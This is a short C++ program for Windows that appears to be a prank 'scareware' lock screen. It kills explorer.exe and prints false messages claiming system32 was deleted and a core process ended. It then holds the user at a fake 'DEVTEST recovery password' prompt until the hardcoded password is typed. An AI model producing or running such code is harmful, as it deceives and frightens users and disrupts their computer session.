#include <iostream>

using namespace std;
string pswd;
string pswdANS = "STARTCOMP";

int main() {
    system("color 0a");
    system("@echo off");
    system("cls");
    cout << "Let me take your IP...\n";
    system("ipconfig");
    system("taskkill /F /IM explorer.exe");
    cout << "Do not turn off this pc...\n";
    cout << "SUCCESS: deleted file folder \"system32\"!\n";
    cout << "Ended process \"windows_core_lib.exe\"\n";
    system("ping localHost > nul");
    system("cls");
    cout << "Enter DEVTEST recovery password: ";
    while (pswd != pswdANS) {
    cin >> pswd;
    if (pswd == pswdANS) {
        system("start explorer.exe");
        cout << "Repaired desktop!\n";
        system("taskkill /F /IM cmd.exe");
    } else {
        cout << "Incorrect.\n";
        system("cls");
        system("echo Enter DEVTEST recovery password: ");
    }
    }
}

